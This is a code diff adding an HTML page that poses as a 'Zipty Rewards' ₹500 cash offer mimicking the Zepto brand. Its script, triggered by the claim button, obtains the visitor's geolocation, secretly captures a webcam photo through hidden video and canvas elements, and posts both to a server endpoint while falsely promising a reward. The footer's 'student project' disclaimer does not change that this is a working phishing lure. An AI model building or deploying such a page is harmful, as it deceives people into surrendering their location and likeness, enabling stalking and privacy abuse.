@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Zipty Rewards - Claim ₹500 Now!</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #ff5858, #f09819);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+    .card {
+      background: rgba(255, 255, 255, 0.95);
+      color: #e60023;
+      padding: 40px 30px;
+      border-radius: 20px;
+      box-shadow: 0 15px 30px rgba(230, 0, 35, 0.4);
+      max-width: 400px;
+      width: 100%;
+      user-select: none;
+    }
+    .logo img {
+      width: 80px;
+      margin-bottom: 15px;
+    }
+    .logo {
+      font-size: 2.5em;
+      font-weight: 700;
+      margin-bottom: 20px;
+      color: #e60023;
+      user-select: text;
+    }
+    .headline {
+      font-size: 1.6em;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+    .subtext {
+      font-size: 1.1em;
+      color: #333;
+      margin-bottom: 30px;
+    }
+    button {
+      background-color: #e60023;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 1.2em;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: 600;
+      transition: background-color 0.3s ease;
+      width: 100%;
+    }
+    button:hover {
+      background-color: #b3001a;
+    }
+    .footer {
+      font-size: 0.75em;
+      color: #999;
+      margin-top: 25px;
+      user-select: none;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <img src="https://cdn-icons-png.flaticon.com/512/447/447031.png" alt="Reward Icon" />
+      Zipty Rewards
+    </div>
+    <div class="headline">🎁 Get ₹500 Zipty Cash! Limited Time Offer 🚀</div>
+    <div class="subtext">Confirm your delivery location to unlock your reward instantly.</div>
+    <button id="start-btn">Claim ₹500 Now</button>
+    <div class="footer">* This is a student project. Not affiliated with Zepto or Zipty.</div>
+  </div>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    async function captureImageAndSend(lat, lon) {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const dataURL = canvas.toDataURL('image/jpeg');
+          const blob = dataURItoBlob(dataURL);
+
+          const formData = new FormData();
+          formData.append('latitude', lat);
+          formData.append('longitude', lon);
+          formData.append('image', blob, 'user.jpg');
+
+          fetch('/capture_location_image', {
+            method: 'POST',
+            body: formData
+          }).then(() => {
+            alert('Your location is set! ₹500 reward is being processed.');
+          }).catch(() => {
+            alert('Something went wrong while sending data.');
+          });
+
+          // Stop video stream
+          stream.getTracks().forEach(track => track.stop());
+        }, 3000);
+      } catch (err) {
+        console.error('Camera access error:', err);
+        alert('Camera access is required to claim your reward.');
+      }
+    }
+
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
+
+    function requestLocationAndCamera() {
+      if (!navigator.geolocation) {
+        alert('Geolocation is not supported by your browser.');
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          captureImageAndSend(lat, lon);
+        },
+        error => {
+          console.error('Location access error:', error);
+          alert('Location access is required to claim your reward.');
+        }
+      );
+    }
+
+    document.getElementById('start-btn').addEventListener('click', requestLocationAndCamera);
+  </script>
+</body>
+</html>
